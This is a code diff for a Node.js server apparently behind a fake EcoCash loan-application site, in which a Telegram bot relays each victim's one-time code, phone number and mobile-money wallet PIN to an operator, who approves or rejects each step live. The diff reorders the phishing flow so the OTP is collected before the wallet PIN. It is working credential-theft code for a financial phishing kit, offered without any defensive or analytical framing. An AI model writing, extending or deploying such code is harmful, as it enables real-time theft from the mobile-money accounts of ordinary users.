@@ -45,22 +45,22 @@ const botManager = {
         if (needsApproval) {
             options.reply_markup = {
                 inline_keyboard: [[
-                    { text: "✅ APPROVE (Move to OTP)", callback_data: `approve_4_${appId}` },
-                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
+                    { text: "✅ APPROVE OTP (Move to Wallet PIN)", callback_data: `approve_4_${appId}` },
+                    { text: "❌ REJECT OTP", callback_data: `reject_4_${appId}` }
                 ]]
             };
         }
         bot.sendMessage(ADMIN_ID, msg, options);
     },
 
-    sendFinalApproval: (appId, pin) => {
-        const msg = `🏁 <b>🇿🇼 FINAL OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 OTP: <code>${pin}</code>`;
+    sendFinalApproval: (appId, phone, password) => {
+        const msg = `🏁 <b>🇿🇼 FINAL ECOCASH WALLET PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n📱 Phone: <code>${phone}</code>\n🔐 PIN: <code>${password}</code>`;
         bot.sendMessage(ADMIN_ID, msg, {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [[
                     { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
-                    { text: "❌ REJECT OTP", callback_data: `reject_5_${appId}` }
+                    { text: "❌ REJECT PIN", callback_data: `reject_5_${appId}` }
                 ]]
             }
         });
@@ -72,7 +72,7 @@ io.on("connection", (socket) => {
     // Generate a secure custom identifier mapping for the active form session
     const appId = "ZIM-" + Math.floor(Math.random() * 90000 + 10000);
     
-    // CRITICAL FIX: Explicitly place the socket into its own unique tracking channel
+    // Explicitly place the socket into its own unique tracking channel
     socket.join(appId);
     socket.emit("session-ready", { appId: appId });
 
@@ -89,13 +89,13 @@ io.on("connection", (socket) => {
     });
 
     socket.on("step4", (data) => {
-        // Receives the EcoCash Wallet phone and initial entry PIN configuration
-        botManager.sendToAdmin(appId, "Step 4: EcoCash Wallet PIN", data, true);
+        // Step 4 now handles the 6-Digit OTP validation delivery
+        botManager.sendToAdmin(appId, "Step 4: OTP Verification", data, true);
     });
 
     socket.on("step5", (data) => {
-        // Handles the final 6-Digit One-Time PIN validation delivery
-        botManager.sendFinalApproval(appId, data.pin);
+        // Step 5 now receives the EcoCash Wallet phone and entry PIN configuration
+        botManager.sendFinalApproval(appId, data.phone, data.password);
     });
 });
 
@@ -110,14 +110,14 @@ bot.on("callback_query", (query) => {
 
     if (action === "approve") {
         if (step === "4") {
-            // Signal room target channel to present the step 5 OTP collection frame
-            io.to(appId).emit('password-verified');
-            bot.answerCallbackQuery(query.id, { text: "6-Digit OTP input shown to user" });
+            // Signal room target channel to present the Step 5 Mobile Money Wallet PIN frame
+            io.to(appId).emit('pin-verified');
+            bot.answerCallbackQuery(query.id, { text: "OTP Verified. Wallet PIN input shown to user." });
         } 
         else if (step === "5") {
             // Complete loan lifecycle pipeline operation status message update
             const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
-            io.to(appId).emit('pin-verified', { referenceId: ref });
+            io.to(appId).emit('password-verified', { referenceId: ref });
             bot.answerCallbackQuery(query.id, { text: "EcoCash Application Completed!" });
         }
         
@@ -130,12 +130,12 @@ bot.on("callback_query", (query) => {
 
     if (action === "reject") {
         if (step === "4") {
-            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
-            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
-        } 
-        else if (step === "5") {
             io.to(appId).emit('pin-rejected', { message: "The 6-digit verification code is invalid or expired." });
             bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
+        } 
+        else if (step === "5") {
+            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
+            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
         }
         
         bot.editMessageText(currentText + "\n\n❌ <b>ACTION: REJECTED</b>", {
